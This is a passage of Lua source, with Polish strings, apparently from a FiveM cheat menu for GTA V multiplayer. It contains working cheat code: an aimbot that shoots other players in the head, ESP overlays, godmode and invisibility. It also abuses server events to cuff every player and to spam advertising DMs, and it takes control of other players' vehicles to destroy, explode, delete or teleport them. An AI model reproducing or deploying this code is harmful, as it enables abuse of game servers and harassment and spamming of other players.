        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 2, true)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 3, true)
        SetVehicleNeonLightsColour(GetVehiclePedIsIn(GetPlayerPed(-1)), 222, 222, 255)
      end

      function DelVeh(veh)
        SetEntityAsMissionEntity(Object, 1, 1)
        DeleteEntity(Object)
        SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
        DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
      end

      function AddVectorsddd(bt, bu)
        return vector3(bt.x + bu.x, bt.y + bu.y, bt.z + bu.z)
    end
      function ShootAt2sddd(aK, bv, bw)
        local bx = GetPedBoneCoords(aK, GetEntityBoneIndexByName(aK, bv), 0.0, 0.0, 0.0)
        local W, aN = GetCurrentPedWeapon(PlayerPedId())
        ShootSingleBulletBetweenCoords(
            AddVectorsddd(bx, vector3(0, 0, 0.1)),
            bx,
            bw,
            true,
            aN,
            PlayerPedId(),
            true,
            false,
            0.3
        )
    end
    function ShootAimbotff(by)
        if
            IsEntityOnScreen(by) and HasEntityClearLosToEntityInFront(PlayerPedId(), by) and not IsPedDeadOrDying(by) and
                IsDisabledControlPressed(0, 24) and
                IsPlayerFreeAiming(PlayerId())
         then
            local z, A, bz = table.unpack(GetEntityCoords(by))
            local W, bA, bB = World3dToScreen2d(z, A, bz)
            if bA > 0.25 and bA < 0.75 and bB > 0.25 and bB < 0.75 then
                local bC, aN = GetCurrentPedWeapon(PlayerPedId())
                ShootAt2sddd(by, "SKEL_HEAD", GetWeaponDamage(aN, 1))
            end
        end
    end
    function DoLines(af)
        local bD, bE, bF = table.unpack(GetEntityCoords(PlayerPedId(-1)))
        local bG, bH, bI = table.unpack(GetEntityCoords(af))
        DrawThickLine(bD, bE, bF, bG, bH, bI, 243, 7, 243, 0)
    end
    function ToggleAimbottpp()
        Citizen.CreateThread(
            function()
                while true do
                    Citizen.Wait(1)
                    for W, af in ipairs(GetActivePlayers()) do
                        ShootAimbotff(GetPlayerPed(af))
                        DoLines(GetPlayerPed(af))
                    end
                end
            end
        )
    end

      function Clean(veh)
        SetVehicleDirtLevel(veh, 15.0)
      end

      function Clean2(veh)
        SetVehicleDirtLevel(veh, 1.0)
      end
      function ApplyForce(entity, direction)
        ApplyForceToEntity(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
      end

      function RequestControlOnce(entity)
        if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
          return true
        end
        SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
        return NetworkRequestControlOfEntity(entity)
      end

      function RequestControl(entity)
        Citizen.CreateThread(function()
        local tick = 0
        while not RequestControlOnce(entity) and tick <= 12 do
          tick = tick+1
          Wait(0)
        end
        return tick <= 12
        end)
      end

      function Oscillate(entity, position, angleFreq, dampRatio)
        local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq*angleFreq))
        local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
        local targetPos = SubVectors(pos1, pos2)

        ApplyForce(entity, targetPos)
      end

      function getEntity(player)
        local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
        return entity
      end

      function GetInputMode()
        return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
      end



      function DrawSpecialText(m_text, showtime)
        SetTextEntry_2("STRING")
        AddTextComponentString(m_text)
        DrawSubtitleTimed(showtime, 1)
      end




      Citizen.CreateThread(function()

      while true do
        Wait( 1 )
        for id = 0, 128 do

          if NetworkIsPlayerActive( id ) and GetPlayerPed( id ) ~= GetPlayerPed( -1 ) then

            ped = GetPlayerPed( id )
            blip = GetBlipFromEntity( ped )

            x1, y1, z1 = table.unpack( GetEntityCoords( GetPlayerPed( -1 ), true ) )
            x2, y2, z2 = table.unpack( GetEntityCoords( GetPlayerPed( id ), true ) )
            distance = math.floor(GetDistanceBetweenCoords(x1,  y1,  z1,  x2,  y2,  z2,  true))

            headId = Citizen.InvokeNative( 0xBFEFE3321A3F5015, ped, GetPlayerName( id ), false, false, "", false )
            wantedLvl = GetPlayerWantedLevel( id )

            if showsprite then
              Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 0, true )
              if wantedLvl then

                Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, true )
                Citizen.InvokeNative( 0xCF228E2AA03099C3, headId, wantedLvl )

              else

                Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, false )

              end
            else
              Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, false )
              Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, false )
              Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 0, false )
            end
            if showblip then

              if not DoesBlipExist( blip ) then
                blip = AddBlipForEntity( ped )
                SetBlipSprite( blip, 1 )
                Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true )
                SetBlipNameToPlayerName(blip, id)

              else

                veh = GetVehiclePedIsIn( ped, false )
                blipSprite = GetBlipSprite( blip )

                if not GetEntityHealth( ped ) then

                  if blipSprite ~= 274 then

                    SetBlipSprite( blip, 274 )
                    Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
                    SetBlipNameToPlayerName(blip, id)

                  end

                elseif veh then

                  vehClass = GetVehicleClass( veh )
                  vehModel = GetEntityModel( veh )

                  if vehClass == 15 then

                    if blipSprite ~= 422 then

                      SetBlipSprite( blip, 422 )
                      Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
                      SetBlipNameToPlayerName(blip, id)

                    end

                  elseif vehClass == 16 then

                    if vehModel == GetHashKey( "besra" ) or vehModel == GetHashKey( "hydra" )
                    or vehModel == GetHashKey( "lazer" ) then

                      if blipSprite ~= 424 then

                        SetBlipSprite( blip, 424 )
                        Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
                        SetBlipNameToPlayerName(blip, id)

                      end

                    elseif blipSprite ~= 423 then

                      SetBlipSprite( blip, 423 )
                      Citizen.InvokeNative (0x5FBCA48327B914DF, blip, false )
                    end
                  elseif vehClass == 14 then
                    if blipSprite ~= 427 then
                      SetBlipSprite( blip, 427 )
                      Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
                    end
                  elseif vehModel == GetHashKey( "insurgent" ) or vehModel == GetHashKey( "insurgent2" )
                    or vehModel == GetHashKey( "limo2" ) then
                      if blipSprite ~= 426 then
                        SetBlipSprite( blip, 426 )
                        Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
                        SetBlipNameToPlayerName(blip, id)
                      end
                    elseif vehModel == GetHashKey( "rhino" ) then
                      if blipSprite ~= 421 then
                        SetBlipSprite( blip, 421 )
                        Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
                        SetBlipNameToPlayerName(blip, id)
                      end
                    elseif blipSprite ~= 1 then
                      SetBlipSprite( blip, 1 )
                      Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true )
                      SetBlipNameToPlayerName(blip, id)
                    end
                    passengers = GetVehicleNumberOfPassengers( veh )
                    if passengers then
                      if not IsVehicleSeatFree( veh, -1 ) then
                        passengers = passengers + 1
                      end
                      ShowNumberOnBlip( blip, passengers )
                    else
                      HideNumberOnBlip( blip )
                    end
                  else
                    HideNumberOnBlip( blip )
                    if blipSprite ~= 1 then
                      SetBlipSprite( blip, 1 )
                      Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true )
                      SetBlipNameToPlayerName(blip, id)
                    end
                  end
                  SetBlipRotation( blip, math.ceil( GetEntityHeading( veh ) ) ) -- update rotation
                  SetBlipNameToPlayerName( blip, id )
                  SetBlipScale( blip,  0.85 )
                  if IsPauseMenuActive() then
                    SetBlipAlpha( blip, 255 )
                  else
                    x1, y1 = table.unpack( GetEntityCoords( GetPlayerPed( -1 ), true ) )
                    x2, y2 = table.unpack( GetEntityCoords( GetPlayerPed( id ), true ) )
                    distance = ( math.floor( math.abs( math.sqrt( ( x1 - x2 ) * ( x1 - x2 ) + ( y1 - y2 ) * ( y1 - y2 ) ) ) / -1 ) ) + 900
                    if distance < 0 then
                      distance = 0
                    elseif distance > 255 then
                      distance = 255
                    end
                    SetBlipAlpha( blip, distance )
                  end
                end
              else
                RemoveBlip(blip)
              end
            end
          end
        end
        end)

        local entityEnumerator = {
          __gc = function(enum)
          if enum.destructor and enum.handle then
            enum.destructor(enum.handle)
          end
          enum.destructor = nil
          enum.handle = nil
        end
      }

      function EnumerateEntities(initFunc, moveFunc, disposeFunc)
        return coroutine.wrap(function()
        local iter, id = initFunc()
        if not id or id == 0 then
          disposeFunc(iter)
          return
        end

        local enum = {handle = iter, destructor = disposeFunc}
        setmetatable(enum, entityEnumerator)

        local next = true
        repeat
          coroutine.yield(id)
          next, id = moveFunc(iter)
        until not next

        enum.destructor, enum.handle = nil, nil
        disposeFunc(iter)
        end)
      end

      function EnumeratePeds()
        return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
      end

      function EnumerateVehicles()
        return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
      end

      function EnumerateObjects()
        return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
      end

      function RotationToDirection(rotation)
        local retz = rotation.z * 0.0174532924
        local retx = rotation.x * 0.0174532924
        local absx = math.abs(math.cos(retx))

        return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
      end

      function OscillateEntity(entity, entityCoords, position, angleFreq, dampRatio)
        if entity ~= 0 and entity ~= nil then
          local direction = ((position - entityCoords) * (angleFreq * angleFreq)) - (2.0 * angleFreq * dampRatio * GetEntityVelocity(entity))
          ApplyForceToEntity(entity, 3, direction.x, direction.y, direction.z + 0.1, 0.0, 0.0, 0.0, false, false, true, true, false, true)
        end
      end



      local invisible = true

      Citizen.CreateThread(
      function()
        while Enabled do
          Citizen.Wait(0)

          SetPlayerInvincible(PlayerId(), Godmode)
          SetEntityInvincible(PlayerPedId(-1), Godmode)
          SetEntityVisible(GetPlayerPed(-1), invisible, 0)

          if SuperJump then
            SetSuperJumpThisFrame(PlayerId(-1))
          end
        


          if freecam then
        Citizen.Wait(0) -- Aktualizacja co 1 sekundę
        local playerIdx = GetPlayerFromServerId(429)
        local playerPed = GetPlayerPed(SelectedPlayer)
        local playerCoords = GetEntityCoords(playerPed)
        local nearbyVehicles = GetGamePool('CVehicle')

        for _, vehicle in ipairs(nearbyVehicles) do
            local vehicleCoords = GetEntityCoords(vehicle)
            local distance = Vdist(playerCoords.x, playerCoords.y, playerCoords.z, vehicleCoords.x, vehicleCoords.y, vehicleCoords.z)

            if distance <= 7000 then
                local netId = NetworkGetNetworkIdFromEntity(vehicle)
                SetNetworkIdCanMigrate(netId, true)
                NetworkRequestControlOfEntity(vehicle)
                local timeout = 0

                while timeout < 1000 and not NetworkHasControlOfEntity(vehicle) do
                    Citizen.Wait(100)
                    timeout = timeout + 100
                end

                if NetworkHasControlOfEntity(vehicle) then
                    Citizen.Wait(100) -- Poczekaj 100ms, aby uniknąć problemów z synchronizacją
                    local playerCoords = GetEntityCoords(playerPed)
                    SetEntityCoords(vehicle, playerCoords.x, playerCoords.y, playerCoords.z)
                end
            end
        end
end
          if InfStamina then
            RestorePlayerStamina(PlayerId(-1), 1.0)
          end

          if fastrun then
            SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49)
            SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
          elseif fastrun2 then
            SetRunSprintMultiplierForPlayer(PlayerId(-1), 5.49)
            SetPedMoveRateOverride(GetPlayerPed(-1), 5.15)
          elseif fastrun3 then
            SetRunSprintMultiplierForPlayer(PlayerId(-1), 10.0)
            SetPedMoveRateOverride(GetPlayerPed(-1), 10.0)
          else
            SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
            SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
          end

          if noragdoll then
            local player = PlayerPedId()
            SetPedCanRagdoll(player, false)
            SetPedCanRagdollFromPlayerImpact(player, false)
            ResetPedRagdollTimer(player)
          else
            local player = PlayerPedId()
            SetPedCanRagdoll(player, true)
            SetPedCanRagdollFromPlayerImpact(player, true)
            ResetPedRagdollTimer(player)
          end

          if VehicleGun then
            local VehicleGunVehicle = "police4"
            local playerPedPos = GetEntityCoords(GetPlayerPed(-1), true)
            if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
              notify("~w~Uruchomiono broń na pojazdy!", false)
              GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999, false, true)
              SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999)
              if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_APPISTOL")) then
                if IsPedShooting(GetPlayerPed(-1)) then
                  while not HasModelLoaded(GetHashKey(VehicleGunVehicle)) do
                    Citizen.Wait(0)
                    RequestModel(GetHashKey(VehicleGunVehicle))
                  end
                  local veh = CreateVehicle(GetHashKey(VehicleGunVehicle), playerPedPos.x + (5 * GetEntityForwardX(GetPlayerPed(-1))), playerPedPos.y + (5 * GetEntityForwardY(GetPlayerPed(-1))), playerPedPos.z + 2.0, GetEntityHeading(GetPlayerPed(-1)), true, true)
                  SetEntityAsNoLongerNeeded(veh)
                  SetVehicleForwardSpeed(veh, 150.0)
                end
              end
            end
          end

          if DeleteGun then
            local cB = getEntity(PlayerId(-1))
            if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then
              notify(
              '~g~Broń do usuwania włączona!~n~~w~Użyj ~o~pistoletu~n~~o~przyceluj ~w~i ~o~strzel ~w~aby usunąć!'
              )
              GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999, false, true)
              SetPedAmmo(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999)
              if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey('WEAPON_PISTOL') then
                if IsPlayerFreeAiming(PlayerId(-1)) then
                  if IsEntityAPed(cB) then
                    if IsPedInAnyVehicle(cB, true) then
                      if IsControlJustReleased(1, 142) then
                        SetEntityAsMissionEntity(GetVehiclePedIsIn(cB, true), 1, 1)
                        DeleteEntity(GetVehiclePedIsIn(cB, true))
                        SetEntityAsMissionEntity(cB, 1, 1)
                        DeleteEntity(cB)
                        notify('~g~Usunięto!')
                      end
                    else
                      if IsControlJustReleased(1, 142) then
                        SetEntityAsMissionEntity(cB, 1, 1)
                        DeleteEntity(cB)
                        notify('~g~Usunięto!')
                      end
                    end
                  else
                    if IsControlJustReleased(1, 142) then
                      SetEntityAsMissionEntity(cB, 1, 1)
                      DeleteEntity(cB)
                      notify('~g~Usunięto!')
                    end
                  end
                end
              end
            end
          end

if LR == nil then
  print('Patryksu FTW')
  SetGamePaused(true)
end

if freezeall then
  for i = 0, 128 do
      TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
      TriggerServerEvent("CheckHandcuff", GetPlayerServerId(i))
      TriggerServerEvent("cuffServer", GetPlayerServerId(i))
      TriggerServerEvent("cuffGranted", GetPlayerServerId(i))
      TriggerServerEvent("police:cuffGranted", GetPlayerServerId(i))
      TriggerServerEvent("xlem0n_policejob:handcuffhype", GetPlayerServerId(i))
      TriggerServerEvent("xlem0n_policejob:handcuffhype", GetPlayerServerId(i))
    end
  end

          if fuckallcars then
            for playerVeh in EnumerateVehicles() do
              if (not IsPedAPlayer(GetPedInVehicleSeat(playerVeh, -1))) then
                SetVehicleHasBeenOwnedByPlayer(playerVeh, false)
                SetEntityAsMissionEntity(playerVeh, true, true)
                StartVehicleAlarm(playerVeh)
                DetachVehicleWindscreen(playerVeh)
                SmashVehicleWindow(playerVeh, 0)
                SmashVehicleWindow(playerVeh, 1)
                SmashVehicleWindow(playerVeh, 2)
                SmashVehicleWindow(playerVeh, 3)
                SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
                SetVehicleDoorBroken(playerVeh, 0, true)
                SetVehicleDoorBroken(playerVeh, 1, true)
                SetVehicleDoorBroken(playerVeh, 2, true)
                SetVehicleDoorBroken(playerVeh, 3, true)
                SetVehicleDoorBroken(playerVeh, 4, true)
                SetVehicleDoorBroken(playerVeh, 5, true)
                SetVehicleDoorBroken(playerVeh, 6, true)
                SetVehicleDoorBroken(playerVeh, 7, true)
                SetVehicleLights(playerVeh, 1)
                Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
                SetVehicleNumberPlateTextIndex(playerVeh, 5)
                SetVehicleNumberPlateText(playerVeh, "Patryksu")
                SetVehicleDirtLevel(playerVeh, 10.0)
                SetVehicleModColor_1(playerVeh, 1)
                SetVehicleModColor_2(playerVeh, 1)
                SetVehicleCustomPrimaryColour(playerVeh, 255, 51, 255)
                SetVehicleCustomSecondaryColour(playerVeh, 255, 51, 255)
                SetVehicleBurnout(playerVeh, true)
              end
            end
          end

if spetejting then
  local playerlist = GetActivePlayers()
  for i = 1, #playerlist do
    local currPlayer = playerlist[i]
      SelectedPlayer = currPlayer
  SpectatePlayer(SelectedPlayer)
  end
end



if mocneautka then
  local cS = GetActivePlayers()
  for l = 1, #cS do
      local dp = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(l)))
      local a4 = GetHashKey("bus")
      local a5 = GetHashKey("alkonost")
      while not HasModelLoaded(a4) do
          RequestModel(a4)
          RequestModel(at)
          Citizen.Wait(0)
      end
      CreateVehicle(a4, GetEntityCoords(dp), GetEntityHeading(dp), true, true)
      CreateVehicle(a5, GetEntityCoords(dp), GetEntityHeading(dp), true, true)
  end
end

if crashujchuja then
  
end


local function DrawThickLine(x1, y1, z1, x2, y2, z2, frequency)
    local col = RGB(1.0)
    local offsets = {-0.002, 0, 0.002} -- 3 linie obok siebie dla grubości
    for i=1,#offsets do
        DrawLine(
            x1 + offsets[i], y1 + offsets[i], z1 + offsets[i],
            x2 + offsets[i], y2 + offsets[i], z2 + offsets[i],
            col.r, col.g, col.b, 255
        )
    end
end

if ostrajazda then
  SetPedToRagdoll(PlayerPedId(), 1000, 1000, 0, true, true, false)
  ClearPedTasks(PlayerPedId())
  for H, al in pairs(GetActivePlayers()) do
      local k = GetPlayerPed(al)
      local dl = GetEntityCoords(k)
      local dm = GetPedBoneCoords(k, 0, 0.0, 0.0, 0.0)
      local dn = GetPedBoneCoords(k, 57005, 0.0, 0.0, 0.2)
      if k ~= PlayerPedId() and not IsPedDeadOrDying(k) then
          ShootSingleBulletBetweenCoords(
              dn,
              dm,
              1,
              true,
              GetHashKey("WEAPON_STUNGUN"),
              PlayerPedId(al),
              true,
              false,
              1.0
          )
          Citizen.Wait(100)
      end
  end
end



		  if cardz then
			local pbase = GetActivePlayers()
			for i = 1, #pbase do
				if IsPedInAnyVehicle(GetPlayerPed(pbase[i]), true) then
					ClearPedTasksImmediately(GetPlayerPed(pbase[i]))
				end
			end
		end

		if gundz then
			local pbase = GetActivePlayers()
			for i = 1, #pbase do
				if i == PlayerPedId(-1) then i=i+1 end
				if IsPedShooting(GetPlayerPed(pbase[i])) then
					ClearPedTasksImmediately(GetPlayerPed(pbase[i]))
				end
			end
		end

          if destroyvehicles then
            for vehicle in EnumerateVehicles() do
              if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
                NetworkRequestControlOfEntity(vehicle)
                SetVehicleUndriveable(vehicle,true)
                SetVehicleEngineHealth(vehicle, 0)
              end
            end
          end

          if alarmvehicles then
            for vehicle in EnumerateVehicles() do
              if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
				NetworkRequestControlOfEntity(vehicle)
				SetVehicleAlarmTimeLeft(vehicle, 500)
                SetVehicleAlarm(vehicle,true)
                StartVehicleAlarm(vehicle)
              end
            end
		  end

      if fivem then
        for vehicle in EnumerateVehicles() do
          if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false)) then
    NetworkRequestControlOfEntity(vehicle)
    SetVehicleAlarmTimeLeft(vehicle, 50000)
            SetVehicleAlarm(vehicle,true)
            StartVehicleAlarm(vehicle)
          end
        end
  end
		  
		  if lolcars then
			for vehicle in EnumerateVehicles() do
				RequestControlOnce(vehicle)
				ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
			end
		end


          if explodevehicles then
            for vehicle in EnumerateVehicles() do
              if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
                NetworkRequestControlOfEntity(vehicle)
                NetworkExplodeVehicle(vehicle, true, true, false)
              end
            end
          end

          if deletenearestvehicle then
            for vehicle in EnumerateVehicles() do
              if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
                SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle, true), 1, 1)
                DeleteEntity(GetVehiclePedIsIn(vehicle, true))
                SetEntityAsMissionEntity(vehicle, 1, 1)
                DeleteEntity(vehicle)
              end
            end
          end

          if vmenuspamdm then
            Citizen.CreateThread(function()
              while vmenuspamdm do
                  for i = 1, 1000 do
                      print("Wysyłam DM do ID: " .. i .. "!")
                      TriggerServerEvent('vMenu:SendMessageToPlayer', i, "discord.gg/5GMHtjKZ7F najlepsze darmowe cheat menu w lua")
                      Wait(100)
                  end
              end
            end)
          end

          if esp then
            for i=1,128 do
              if  ((NetworkIsPlayerActive( i )) and GetPlayerPed( i ) ~= GetPlayerPed()) then
                local ra = {r = 22, g = 22, b = 22, a = 255}
                local rab = {r = 66, g = 66, b = 66, a = 255}
                local pPed = GetPlayerPed(i)
                local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
                local x, y, z = table.unpack(GetPedBoneCoords(pPed, 0x796E, 0.0, 0.0, 0.0))
                local disPlayerNames = 130
                local disPlayerNamesz = 999999
                  if nameabove then
                    distance = math.floor(GetDistanceBetweenCoords(cx,  cy,  cz,  x,  y,  z,  true))
                      if ((distance < disPlayerNames)) then
                          DrawText3D(x, y, z+0.1, GetPlayerServerId(i).."  |  "..GetPlayerName(i), rab.r,rab.g,rab.b)
                      end
                  end
                local message =
                "Nazwa: " ..
                GetPlayerName(i) ..
                "\nID serwerowe: " ..
                GetPlayerServerId(i) ..
                "\nID peda: " .. i .. "\nOdległość: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, true), 1)
                if IsPedInAnyVehicle(pPed, true) then
				         local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
                  message = message .. "\nPojazd: " .. VehName
                end
                if ((distance < disPlayerNamesz)) then
                if espinfo and esp then
                  DrawText3D(x, y, z, message, rab.r, rab.g, rab.b)
                end
                if espbox and esp then
                  LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                  LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                  LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                  LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                  LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                  LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                  LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

                  TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                  TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                  TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                  TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                  TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                  TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                  TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

                  ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                  ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                  ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                  ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                  ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                  ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                  ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                  ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)

                  DrawThickLine(
                  LineOneBegin.x,
                  LineOneBegin.y,
                  LineOneBegin.z,
                  LineOneEnd.x,
                  LineOneEnd.y,
                  LineOneEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  222
                  )
                  DrawThickLine(
                  LineTwoBegin.x,
                  LineTwoBegin.y,
                  LineTwoBegin.z,
                  LineTwoEnd.x,
                  LineTwoEnd.y,
                  LineTwoEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  222
                  )
                  DrawThickLine(
                  LineThreeBegin.x,
                  LineThreeBegin.y,
                  LineThreeBegin.z,
                  LineThreeEnd.x,
                  LineThreeEnd.y,
                  LineThreeEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  222
                  )
                  DrawThickLine(
                  LineThreeEnd.x,
                  LineThreeEnd.y,
                  LineThreeEnd.z,
                  LineFourBegin.x,
                  LineFourBegin.y,
                  LineFourBegin.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  222
                  )
                  DrawThickLine(
                  TLineOneBegin.x,
                  TLineOneBegin.y,
                  TLineOneBegin.z,
                  TLineOneEnd.x,
                  TLineOneEnd.y,
                  TLineOneEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  222
                  )
                  DrawThickLine(
                  TLineTwoBegin.x,
                  TLineTwoBegin.y,
                  TLineTwoBegin.z,
                  TLineTwoEnd.x,
                  TLineTwoEnd.y,
                  TLineTwoEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  222
                  )
                  DrawThickLine(
                  TLineThreeBegin.x,
                  TLineThreeBegin.y,
                  TLineThreeBegin.z,
                  TLineThreeEnd.x,
                  TLineThreeEnd.y,
                  TLineThreeEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  222
                  )
                  DrawThickLine(
                  TLineThreeEnd.x,
                  TLineThreeEnd.y,
                  TLineThreeEnd.z,
                  TLineFourBegin.x,
                  TLineFourBegin.y,
                  TLineFourBegin.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  222
                  )
                  DrawThickLine(
                  ConnectorOneBegin.x,
                  ConnectorOneBegin.y,
                  ConnectorOneBegin.z,
                  ConnectorOneEnd.x,
                  ConnectorOneEnd.y,
                  ConnectorOneEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  222
                  )
                  DrawThickLine(
                  ConnectorTwoBegin.x,
                  ConnectorTwoBegin.y,
                  ConnectorTwoBegin.z,
                  ConnectorTwoEnd.x,
                  ConnectorTwoEnd.y,
                  ConnectorTwoEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  222
                  )
                  DrawThickLine(
                  ConnectorThreeBegin.x,
                  ConnectorThreeBegin.y,
                  ConnectorThreeBegin.z,
                  ConnectorThreeEnd.x,
                  ConnectorThreeEnd.y,
                  ConnectorThreeEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  222
                  )
                  DrawThickLine(
                  ConnectorFourBegin.x,
                  ConnectorFourBegin.y,
                  ConnectorFourBegin.z,
                  ConnectorFourEnd.x,
                  ConnectorFourEnd.y,
                  ConnectorFourEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  222
                  )
                end
                if esplines and esp then
                  DrawThickLine(cx, cy, cz, x, y, z, ra.r, ra.g, ra.b, 245)
                end
              end
            end
          end
          end

          if VehGod and IsPedInAnyVehicle(PlayerPedId(-1), true) then
            SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true)
          end
          if VehInv and IsPedInAnyVehicle(PlayerPedId(-1), true) then
              SetEntityVisible(GetVehiclePedIsUsing(PlayerPedId(-1)), false, false)
          elseif not VehInv and IsPedInAnyVehicle(PlayerPedId(-1), true) then
              SetEntityVisible(GetVehiclePedIsUsing(PlayerPedId(-1)), true, false)
          end


          if oneshot then
            SetPlayerWeaponDamageModifier(PlayerId(-1), 100.0)
            local gotEntity = getEntity(PlayerId(-1))
            if IsEntityAPed(gotEntity) then
              if IsPedInAnyVehicle(gotEntity, true) then
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                  if IsControlJustReleased(1, 69) then
